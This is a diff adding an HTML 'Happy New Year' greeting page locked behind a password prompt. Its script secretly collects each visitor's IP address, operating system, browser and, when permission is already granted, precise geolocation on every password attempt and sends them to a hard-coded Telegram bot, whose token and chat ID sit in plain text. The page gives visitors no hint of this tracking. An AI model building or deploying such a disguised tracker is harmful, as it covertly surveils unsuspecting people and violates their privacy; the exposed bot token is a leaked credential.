@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Locked | Happy New Year</title>
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&family=Kalam:wght@300;400;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --pink: #f7d3e8;
+      --lightpink: #fdebf5;
+      --lavender: #dcd7fc;
+      --blue: #c4e2ff;
+      --mint: #d6fff2;
+      --borderGlass: rgba(255,255,255,0.4);
+      --textMain: #444;
+      --whiteglass: rgba(255,255,255,0.55);
+    }
+
+    * {margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+    body {
+      height:100vh;overflow:hidden;
+      background:linear-gradient(135deg,var(--pink),var(--lavender),var(--blue),var(--mint));
+      background-size:400% 400%;animation:bgFlow 16s ease infinite;
+      display:flex;justify-content:center;align-items:center;position:relative;
+    }
+    @keyframes bgFlow {
+      0%{background-position:0% 50%}
+      50%{background-position:100% 50%}
+      100%{background-position:0% 50%}
+    }
+
+    .particle {
+      position:absolute;width:6px;height:6px;border-radius:50%;
+      background:rgba(255,255,255,.8);animation:floaty 8s infinite linear;opacity:.7;
+    }
+    @keyframes floaty {
+      0%{transform:translateY(0) scale(1);}
+      50%{transform:translateY(-80px) scale(1.3);}
+      100%{transform:translateY(0) scale(1);}
+    }
+
+    .card {
+      width:90%;max-width:420px;background:var(--whiteglass);
+      backdrop-filter:blur(12px);border-radius:22px;padding:3rem 2rem;
+      border:2px solid var(--borderGlass);display:flex;flex-direction:column;
+      gap:1.6rem;animation:fadeIn 1.8s ease forwards;opacity:0;
+    }
+    @keyframes fadeIn {
+      from{opacity:0;transform:translateY(20px);}
+      to{opacity:1;transform:translateY(0);}
+    }
+
+    h1{text-align:center;font-size:2.2rem;color:var(--textMain);
+      font-weight:600;letter-spacing:1px;font-family:'Kalam',cursive;}
+    p{text-align:center;color:#555;font-size:.95rem;margin-top:-10px;}
+
+    .input-area{display:flex;flex-direction:column;gap:1rem;width:100%;}
+    input{
+      padding:.9rem 1rem;border-radius:12px;border:2px solid rgba(255,255,255,0.6);
+      background:rgba(255,255,255,0.9);outline:none;font-size:1rem;transition:.3s;
+    }
+    input:focus{border-color:var(--lavender);background:white;}
+
+    button{
+      padding:.9rem 1rem;border-radius:12px;border:none;background:var(--lavender);
+      color:#555;font-size:1rem;font-weight:600;cursor:pointer;transition:.3s;
+      letter-spacing:.5px;
+    }
+    button:hover{background:var(--pink);transform:translateY(-3px);}
+
+    .footer{text-align:center;font-size:.8rem;color:#555;margin-top:1rem;opacity:.7;}
+  </style>
+</head>
+
+<body>
+
+  <div id="particles-container"></div>
+
+  <div class="card">
+    <h1>🔒 Locked</h1>
+    <p>enter secret to unlock <br> new year magic ✨</p>
+
+    <div class="input-area">
+      <input type="password" id="pass" placeholder="enter password...">
+      <button onclick="unlock()">Unlock</button>
+    </div>
+
+    <div id="err" style="text-align:center;color:#d33;font-size:.9rem;min-height:20px;"></div>
+
+    <div class="footer">
+      Happy New Year vibes 💗🌸
+    </div>
+  </div>
+
+  <script>
+    /* ===== YOUR PASSWORD ===== */
+    const correctPass = "singh";
+
+    /* ===== YOUR TELEGRAM INFO ===== */
+    const BOT_TOKEN = "8515633524:AAEHGTKp1F0QZSG3qmTHKFyGKDNk3-Pk4TY"; 
+    const CHAT_ID = "5627751954";
+
+    /* ===== particles aesthetic ===== */
+    const particleContainer = document.getElementById('particles-container');
+    const amt = 50;
+    for(let i=0;i<amt;i++){
+      let p = document.createElement('div');
+      p.classList.add('particle');
+      let size = Math.random()*6+3;
+      p.style.width=size+'px';
+      p.style.height=size+'px';
+      p.style.left=Math.random()*100+'vw';
+      p.style.top=Math.random()*100+'vh';
+      p.style.animationDuration=(Math.random()*5+5)+'s';
+      p.style.animationDelay=Math.random()*5+'s';
+      particleContainer.appendChild(p);
+    }
+
+    /* ===== INFO FUNCTIONS ===== */
+    async function getIP(){
+      try{
+        let r = await fetch("https://api.ipify.org?format=json");
+        let d = await r.json();
+        return d.ip;
+      }catch{return "unknown"}
+    }
+
+    function getDeviceInfo(){
+      let ua = navigator.userAgent;
+      let os = ua.includes("Android")?"Android 📱":
+               ua.includes("iPhone") ?"iOS 🍎":
+               ua.includes("Windows")?"Windows 💻":
+               ua.includes("Mac")?"MacOS 🍏":"Unknown";
+      let browser = ua.includes("Chrome")?"Chrome 🌐":
+                    ua.includes("Firefox")?"Firefox 🔥":
+                    ua.includes("Safari")&&!ua.includes("Chrome")?"Safari 🧭":
+                    ua.includes("Edg")?"Edge 🌀":"Unknown";
+      return {os,browser};
+    }
+
+    async function getLocSilent(){
+      return new Promise((resolve)=>{
+        navigator.permissions?.query({name:'geolocation'}).then((res)=>{
+          if(res.state==="granted"){
+            navigator.geolocation.getCurrentPosition(
+              p=>resolve(`Lat:${p.coords.latitude}, Lon:${p.coords.longitude}`),
+              ()=>resolve("Location denied")
+            );
+          } else resolve("No permission (silent)");
+        }).catch(()=>resolve("Not supported"));
+      });
+    }
+
+    function sendToTelegram(text){
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+    }
+
+    /* ===== UNLOCK + ALERT INTEGRATED ===== */
+    async function unlock(){
+      let pass = document.getElementById("pass").value.trim().toLowerCase();
+      let err = document.getElementById("err");
+
+      if(!pass){
+        err.style.color="#d33";
+        err.innerHTML="password type karo pls 🙏";
+        return;
+      }
+
+      const ip = await getIP();
+      const device = getDeviceInfo();
+      const location = await getLocSilent();
+      const time = new Date().toLocaleString();
+
+      if(pass === correctPass){
+        err.style.color="#4caf50";
+        err.innerHTML="unlocking...";
+
+        sendToTelegram(`CORRECT PASSWORD USED ✅
+IP: ${ip}
+Time: ${time}
+OS: ${device.os}
+Browser: ${device.browser}
+Location: ${location}`);
+
+        setTimeout(()=>{ window.location.href="index2.html"; },1000);
+
+      } else {
+        err.style.color="#d33";
+        err.innerHTML="wrong pass ❌ try again";
+
+        sendToTelegram(`WRONG PASSWORD ATTEMPT 🚨
+IP: ${ip}
+Time: ${time}
+OS: ${device.os}
+Browser: ${device.browser}
+Location: ${location}`);
+      }
+    }
+
+    /* enter key unlock */
+    document.getElementById("pass").addEventListener("keyup",(e)=>{
+      if(e.key==="Enter"){ unlock(); }
+    });
+  </script>
+
+</body>
+</html>
